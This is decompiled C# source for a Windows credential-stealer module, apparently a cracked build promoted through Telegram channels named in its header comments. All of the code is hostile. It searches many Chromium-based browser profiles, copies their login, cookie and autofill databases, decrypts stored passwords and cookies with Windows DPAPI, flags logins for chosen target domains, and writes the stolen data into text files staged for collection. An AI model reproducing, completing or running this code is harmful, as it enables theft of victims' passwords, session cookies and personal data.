// Cracked by Milfachs. t.me/milfachs or t.me/stroleyman.
// Telegram Channel - t.me/darkwanna

using Stealer;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal class Class1
{
  public static void smethod_0(string string_0)
  {
    Directory.CreateDirectory(string_0);
    try
    {
      Class1.smethod_5();
    }
    catch
    {
    }
    Class1.smethod_3();
    string str = "";
    List<Class6> class6List = Class1.smethod_4();
    foreach (Class6 class6 in class6List)
      str += class6.ToString();
    File.WriteAllText(string_0 + "\\AutoFill.txt", str + "\n――――――――――――――――――――――――――――――――――――――――――――");
    Class7.string_2 = class6List.Count.ToString();
  }

  [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool CryptUnprotectData(
    ref Class1.Struct1 struct1_0,
    ref string string_0,
    ref Class1.Struct1 struct1_1,
    IntPtr intptr_0,
    ref Class1.Struct0 struct0_0,
    int int_0,
    ref Class1.Struct1 struct1_2);

  private static byte[] smethod_1(byte[] byte_0, byte[] byte_1 = null)
  {
    Class1.Struct1 struct1_2 = new Class1.Struct1();
    Class1.Struct1 struct1_0 = new Class1.Struct1();
    Class1.Struct1 struct1_1 = new Class1.Struct1();
    Class1.Struct0 struct0_0 = new Class1.Struct0()
    {
      int_0 = Marshal.SizeOf(typeof (Class1.Struct0)),
      int_1 = 0,
      intptr_0 = IntPtr.Zero,
      string_0 = (string) null
    };
    string empty = string.Empty;
    try
    {
      try
      {
        if (byte_0 == null)
          byte_0 = new byte[0];
        struct1_0.intptr_0 = Marshal.AllocHGlobal(byte_0.Length);
        struct1_0.int_0 = byte_0.Length;
        Marshal.Copy(byte_0, 0, struct1_0.intptr_0, byte_0.Length);
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (byte_1 == null)
          byte_1 = new byte[0];
        struct1_1.intptr_0 = Marshal.AllocHGlobal(byte_1.Length);
        struct1_1.int_0 = byte_1.Length;
        Marshal.Copy(byte_1, 0, struct1_1.intptr_0, byte_1.Length);
      }
      catch (Exception ex)
      {
      }
      Class1.CryptUnprotectData(ref struct1_0, ref empty, ref struct1_1, IntPtr.Zero, ref struct0_0, 1, ref struct1_2);
      byte[] destination = new byte[struct1_2.int_0];
      Marshal.Copy(struct1_2.intptr_0, destination, 0, struct1_2.int_0);
      return destination;
    }
    catch (Exception ex)
    {
    }
    finally
    {
      if (struct1_2.intptr_0 != IntPtr.Zero)
        Marshal.FreeHGlobal(struct1_2.intptr_0);
      if (struct1_0.intptr_0 != IntPtr.Zero)
        Marshal.FreeHGlobal(struct1_0.intptr_0);
      if (struct1_1.intptr_0 != IntPtr.Zero)
        Marshal.FreeHGlobal(struct1_1.intptr_0);
    }
    return new byte[0];
  }

  private static List<Class2> smethod_2(string string_0)
  {
    if (!File.Exists(string_0))
      return (List<Class2>) null;
    try
    {
      string str = Path.GetTempPath() + "/" + Class4.smethod_2() + ".fv";
      if (File.Exists(str))
        File.Delete(str);
      File.Copy(string_0, str, true);
      Class5 class5 = new Class5(str);
      List<Class2> class2List = new List<Class2>();
      class5.method_6("cookies");
      for (int int_0 = 0; int_0 < class5.method_2(); ++int_0)
      {
        try
        {
          string empty = string.Empty;
          try
          {
            empty = Encoding.UTF8.GetString(Class1.smethod_1(Encoding.Default.GetBytes(class5.method_3(int_0, 12)), (byte[]) null));
          }
          catch (Exception ex)
          {
          }
          if (empty != "")
          {
            Class2 class2_1 = new Class2();
            class2_1.method_3(class5.method_3(int_0, 1));
            class2_1.method_5(class5.method_3(int_0, 2));
            class2_1.method_7(class5.method_3(int_0, 4));
            class2_1.method_1(class5.method_3(int_0, 5));
            class2_1.BbKtsYeAa(class5.method_3(int_0, 6));
            class2_1.method_10(empty);
            Class2 class2_2 = class2_1;
            class2List.Add(class2_2);
          }
        }
        catch (Exception ex)
        {
        }
      }
      File.Delete(str);
      return class2List;
    }
    catch (Exception ex)
    {
      return (List<Class2>) null;
    }
  }

  private static void smethod_3()
  {
    Directory.CreateDirectory(Program.path + "\\Browsers\\Cookies");
    List<Class2> class2List1 = new List<Class2>();
    File.WriteAllText(Program.path + "\\Browsers\\CookiesList.txt", "");
    string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
    string[] strArray = new string[7]
    {
      environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
      Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
      environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
      environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
      environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
      environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
      environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
    };
    for (int index = 0; index < strArray.Length; ++index)
    {
      List<Class2> class2List2 = Class1.smethod_2(strArray[index]);
      if (class2List2 != null)
      {
        try
        {
          string contents = (string) null;
          foreach (Class2 class2 in class2List2)
            contents += class2.ToString();
          File.WriteAllText(Program.path + string.Format("\\Browsers\\Cookies\\Cookies_{0}.txt", (object) index), contents);
          using (StreamWriter streamWriter = new StreamWriter(Program.path + "\\Browsers\\CookiesList.txt", true, Encoding.Default))
            streamWriter.WriteLine(strArray[index] + string.Format(" - Cookies_{0}.txt - Count: {1}", (object) index, (object) class2List2.Count));
          Class7.string_1 = ((long) uint.Parse(Class7.string_1) + (long) class2List2.Count).ToString();
        }
        catch (Exception ex)
        {
          Console.Write((object) ex);
          Console.Read();
        }
      }
    }
  }

  private static List<Class6> smethod_4()
  {
    List<Class6> class6List1 = new List<Class6>();
    List<string> stringList1 = new List<string>();
    List<string> stringList2 = new List<string>();
    stringList2.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
    stringList2.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
    List<string> stringList3 = new List<string>();
    foreach (string path in stringList2)
    {
      try
      {
        stringList3.AddRange(Directory.EnumerateDirectories(path));
      }
      catch
      {
      }
    }
    foreach (string path in stringList3)
    {
      try
      {
        stringList1.AddRange(Directory.EnumerateFiles(path, "Login Data", SearchOption.AllDirectories));
        stringList1.AddRange(Directory.EnumerateFiles(path, "Web Data", SearchOption.AllDirectories));
      }
      catch
      {
      }
    }
    foreach (string string_0 in stringList1.ToArray())
    {
      List<Class6> class6List2 = Class1.VjhRurMaE(string_0);
      if (class6List2 != null)
        class6List1.AddRange((IEnumerable<Class6>) class6List2);
    }
    return class6List1;
  }

  private static List<Class6> VjhRurMaE(string string_0)
  {
    try
    {
      string str = Path.GetTempPath() + "/" + Class4.smethod_2() + ".fv";
      if (File.Exists(str))
        File.Delete(str);
      File.Copy(string_0, str, true);
      Class5 class5 = new Class5(str);
      List<Class6> class6List = new List<Class6>();
      class5.method_6("autofill");
      if (class5.method_2() == 65536)
        return (List<Class6>) null;
      for (int int_0 = 0; int_0 < class5.method_2(); ++int_0)
      {
        try
        {
          Class6 class6_1 = new Class6();
          class6_1.Name = class5.method_3(int_0, 0);
          class6_1.method_1(class5.method_3(int_0, 1));
          Class6 class6_2 = class6_1;
          class6List.Add(class6_2);
        }
        catch (Exception ex)
        {
        }
      }
      File.Delete(str);
      return class6List;
    }
    catch (Exception ex)
    {
      return (List<Class6>) null;
    }
  }

  private static void smethod_5()
  {
    Directory.CreateDirectory(Program.path + "\\Browsers\\Cookies");
    List<LogPassData> logPassDataList = new List<LogPassData>();
    List<string> stringList1 = new List<string>();
    List<string> stringList2 = new List<string>();
    stringList2.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
    stringList2.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
    List<string> stringList3 = new List<string>();
    foreach (string path in stringList2)
    {
      try
      {
        stringList3.AddRange(Directory.EnumerateDirectories(path));
      }
      catch
      {
      }
    }
    using (List<string>.Enumerator enumerator = stringList3.GetEnumerator())
    {
label_81:
      while (enumerator.MoveNext())
      {
        string current = enumerator.Current;
        try
        {
          string[] files = Directory.GetFiles(current, "Login Data", SearchOption.AllDirectories);
          int index = 0;
          while (true)
          {
            if (index < files.Length)
            {
              string str1 = files[index];
              try
              {
                if (File.Exists(str1))
                {
                  string str2 = "Unknown (" + str1 + ")";
                  if (str1.Contains("Chrome"))
                    str2 = "Google Chrome";
                  if (str1.Contains("Yandex"))
                    str2 = "Yandex Browser";
                  if (str1.Contains("Orbitum"))
                    str2 = "Orbitum Browser";
                  if (str1.Contains("Opera"))
                    str2 = "Opera Browser";
                  if (str1.Contains("Amigo"))
                    str2 = "Amigo Browser";
                  if (str1.Contains("Torch"))
                    str2 = "Torch Browser";
                  if (str1.Contains("Comodo"))
                    str2 = "Comodo Browser";
                  if (str1.Contains("CentBrowser"))
                    str2 = "CentBrowser";
                  if (str1.Contains("Go!"))
                    str2 = "Go!";
                  if (str1.Contains("uCozMedia"))
                    str2 = "uCozMedia";
                  if (str1.Contains("Rockmelt"))
                    str2 = "Rockmelt";
                  if (str1.Contains("Sleipnir"))
                    str2 = "Sleipnir";
                  if (str1.Contains("SRWare Iron"))
                    str2 = "SRWare Iron";
                  if (str1.Contains("Vivaldi"))
                    str2 = "Vivaldi";
                  if (str1.Contains("Sputnik"))
                    str2 = "Sputnik";
                  if (str1.Contains("Maxthon"))
                    str2 = "Maxthon";
                  if (str1.Contains("AcWebBrowser"))
                    str2 = "AcWebBrowser";
                  if (str1.Contains("Epic Browser"))
                    str2 = "Epic Browser";
                  if (str1.Contains("MapleStudio"))
                    str2 = "MapleStudio";
                  if (str1.Contains("BlackHawk"))
                    str2 = "BlackHawk";
                  if (str1.Contains("Flock"))
                    str2 = "Flock";
                  if (str1.Contains("CoolNovo"))
                    str2 = "CoolNovo";
                  if (str1.Contains("Baidu Spark"))
                    str2 = "Baidu Spark";
                  if (str1.Contains("Titan Browser"))
                    str2 = "Titan Browser";
                  try
                  {
                    string str3 = Path.GetTempPath() + "/" + Class4.smethod_2() + ".fv";
                    if (File.Exists(str3))
                      File.Delete(str3);
                    File.Copy(str1, str3, true);
                    Class5 class5 = new Class5(str3);
                    if (class5.method_6("logins"))
                    {
                      int int_0 = 0;
                      while (true)
                      {
                        try
                        {
                          for (; int_0 < class5.method_2(); ++int_0)
                          {
                            try
                            {
                              string empty = string.Empty;
                              try
                              {
                                empty = Encoding.UTF8.GetString(Class1.smethod_1(Encoding.Default.GetBytes(class5.method_3(int_0, 5)), (byte[]) null));
                              }
                              catch (Exception ex)
                              {
                              }
                              if (empty != "")
                              {
                                LogPassData logPassData = new LogPassData()
                                {
                                  Url = class5.method_3(int_0, 1).Replace("https://", "").Replace("http://", ""),
                                  Login = class5.method_3(int_0, 3),
                                  Password = empty,
                                  Program = str2
                                };
                                logPassDataList.Add(logPassData);
                              }
                            }
                            catch (Exception ex)
                            {
                            }
                          }
                          break;
                        }
                        catch
                        {
                        }
                      }
                      File.Delete(str3);
                    }
                    else
                      goto label_81;
                  }
                  catch
                  {
                  }
                }
              }
              catch (Exception ex)
              {
              }
              ++index;
            }
            else
              goto label_81;
          }
        }
        catch
        {
        }
      }
    }
    Environment.GetEnvironmentVariable("LocalAppData");
    string[] array = stringList1.ToArray();
    for (int index = 0; index < array.Length; ++index)
    {
      if (File.Exists(array[index]))
      {
        string str1 = "Unknown (" + array[index] + ")";
        if (array[index].Contains("Chrome"))
          str1 = "Google Chrome";
        if (array[index].Contains("Yandex"))
          str1 = "Yandex Browser";
        if (array[index].Contains("Orbitum"))
          str1 = "Orbitum Browser";
        if (array[index].Contains("Opera"))
          str1 = "Opera Browser";
        if (array[index].Contains("Amigo"))
          str1 = "Amigo Browser";
        if (array[index].Contains("Torch"))
          str1 = "Torch Browser";
        if (array[index].Contains("Comodo"))
          str1 = "Comodo Browser";
        if (array[index].Contains("CentBrowser"))
          str1 = "CentBrowser";
        if (array[index].Contains("Go!"))
          str1 = "Go!";
        if (array[index].Contains("uCozMedia"))
          str1 = "uCozMedia";
        if (array[index].Contains("Rockmelt"))
          str1 = "Rockmelt";
        if (array[index].Contains("Sleipnir"))
          str1 = "Sleipnir";
        if (array[index].Contains("SRWare Iron"))
          str1 = "SRWare Iron";
        if (array[index].Contains("Vivaldi"))
          str1 = "Vivaldi";
        if (array[index].Contains("Sputnik"))
          str1 = "Sputnik";
        if (array[index].Contains("Maxthon"))
          str1 = "Maxthon";
        if (array[index].Contains("AcWebBrowser"))
          str1 = "AcWebBrowser";
        if (array[index].Contains("Epic Browser"))
          str1 = "Epic Browser";
        if (array[index].Contains("MapleStudio"))
          str1 = "MapleStudio";
        if (array[index].Contains("BlackHawk"))
          str1 = "BlackHawk";
        if (array[index].Contains("Flock"))
          str1 = "Flock";
        if (array[index].Contains("CoolNovo"))
          str1 = "CoolNovo";
        if (array[index].Contains("Baidu Spark"))
          str1 = "Baidu Spark";
        if (array[index].Contains("Titan Browser"))
          str1 = "Titan Browser";
        try
        {
          string str2 = Path.GetTempPath() + "/" + Class4.smethod_2() + ".fv";
          if (File.Exists(str2))
            File.Delete(str2);
          File.Copy(array[index], str2, true);
          Class5 class5 = new Class5(str2);
          if (class5.method_6("logins"))
          {
            int int_0 = 0;
            while (true)
            {
              try
              {
                for (; int_0 < class5.method_2(); ++int_0)
                {
                  try
                  {
                    string empty = string.Empty;
                    try
                    {
                      empty = Encoding.UTF8.GetString(Class1.smethod_1(Encoding.Default.GetBytes(class5.method_3(int_0, 5)), (byte[]) null));
                    }
                    catch (Exception ex)
                    {
                    }
                    if (empty != "")
                    {
                      LogPassData logPassData = new LogPassData()
                      {
                        Url = class5.method_3(int_0, 1).Replace("https://", "").Replace("http://", ""),
                        Login = class5.method_3(int_0, 3),
                        Password = empty,
                        Program = str1
                      };
                      logPassDataList.Add(logPassData);
                    }
                  }
                  catch (Exception ex)
                  {
                  }
                }
                break;
              }
              catch
              {
              }
            }
            File.Delete(str2);
          }
          else
            break;
        }
        catch
        {
        }
      }
    }
    string str4 = "";
    foreach (LogPassData logPassData in logPassDataList)
    {
      str4 += logPassData.ToString();
      try
      {
        string url;
        if (!logPassData.Url.Contains("/"))
          url = logPassData.Url;
        else
          url = logPassData.Url.Split('/')[0];
        string str1 = url;
        if (!Class7.string_10.Contains(str1))
        {
          if (Program.domaindetect.Contains(str1))
            Class7.string_10 = Class7.string_10 + str1 + ";";
        }
      }
      catch (Exception ex)
      {
        Console.Write((object) ex);
      }
    }
    File.WriteAllText(Program.path + "\\Browsers\\Passwords.txt", str4 != null ? str4 + "\n――――――――――――――――――――――――――――――――――――――――――――" : "");
    Class7.string_0 = logPassDataList.Count.ToString();
  }

  public Class1()
  {
    Class11.ARXWv9qzu32dU();
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  private struct Struct0
  {
    public int int_0;
    public int int_1;
    public IntPtr intptr_0;
    public string string_0;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  private struct Struct1
  {
    public int int_0;
    public IntPtr intptr_0;
  }
}
